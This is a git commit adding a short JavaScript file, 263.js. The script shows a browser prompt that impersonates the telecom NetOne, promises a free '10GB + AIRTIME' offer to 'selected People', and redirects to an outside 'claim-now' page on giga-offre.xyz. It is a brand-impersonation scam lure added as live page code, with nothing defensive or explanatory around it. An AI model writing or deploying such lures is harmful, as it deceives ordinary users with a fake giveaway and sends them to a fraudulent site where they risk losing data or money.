72593d500b28ff8f5703f7ffb9ec456a7ce66a2e
bigetijazz5 <bigetijazz5@gmail.com>
2024-10-24 22:45:04 -0700

    Create 263.js

---
+++ 263.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 10GB + AIRTIME '
+password=prompt('NetOne: Hello, you are among the selected People to benefit from this offer. Press Ok to get offer now ','ACTIVATE 10GB + AIRTIME');
+if (password != 'ACTIVATE 10GB + AIRTIME') {
+location.href='https://www.giga-offre.xyz/claim-now';
+}
